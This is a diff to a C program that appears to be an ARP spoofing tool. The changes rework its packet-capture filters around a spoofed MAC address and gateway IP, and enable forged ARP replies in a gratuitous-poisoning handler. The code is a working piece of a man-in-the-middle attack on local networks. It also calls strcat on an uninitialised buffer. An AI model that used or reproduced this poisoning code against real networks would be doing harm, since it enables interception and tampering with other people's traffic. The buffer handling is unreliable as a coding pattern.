@@ -143,9 +143,18 @@ int main(int argc, char const *argv[]) {
   }
 
   // Poisoner loop
-  char* poisonerFilter = malloc(100 * sizeof(char));
-  strcat(poisonerFilter, "arp dst host ");
-  strcat(poisonerFilter, gGatewayIP);
+  char* poisonerFilter = malloc(150 * sizeof(char));
+  strcpy(poisonerFilter, "ether host not ");
+  char aus[20]; stringFyMAC(aus, gSpoofedMAC);
+  strcat(poisonerFilter, aus);
+
+  if(gIsGratious == FALSE) {
+    strcat(poisonerFilter, " && arp dst host ");
+    strcat(poisonerFilter, gGatewayIP);
+  }
+  else {
+    strcat(poisonerFilter, " && arp");
+  }
 
   ThreadArgs* poisonArgs = malloc(sizeof(ThreadArgs));
   poisonArgs -> captureHandler = &gPoisongHandler;
@@ -165,10 +174,12 @@ int main(int argc, char const *argv[]) {
   char spoofedMac[18];
   stringFyMAC(spoofedMac, gSpoofedMAC);
   int policiesLength = (policies == NULL) ? 0 : strlen(policies);
-  int filterLength = strlen(spoofedMac) + policiesLength + 21;
+  int filterLength = strlen(spoofedMac) + policiesLength + 100;
   char* gatekeeperFilter = malloc(filterLength * sizeof(char));
 
-  strcat(gatekeeperFilter, "ether dst ");
+  strcat(gatekeeperFilter, "ether src not ");
+  strcat(gatekeeperFilter, spoofedMac);
+  strcat(gatekeeperFilter, " && ether dst ");
   strcat(gatekeeperFilter, spoofedMac);
   if(policies != NULL) {
     strcat(gatekeeperFilter, " && (");
@@ -339,7 +350,7 @@ void Poisoner(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
 void GratiousPoisoner(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
   ArpFormat* arpMsg = (ArpFormat*) (bytes + 14); // 14 Byte Ethernet header
 
-  // arpMsg->operation = ARP_REPLY;
+  arpMsg->operation = ARP_REPLY;
   memcpy(arpMsg->srcPrAddr, arpMsg->dstPrAddr, 4);
   memcpy(arpMsg->srcHwAddr, gSpoofedMAC, 6);
 
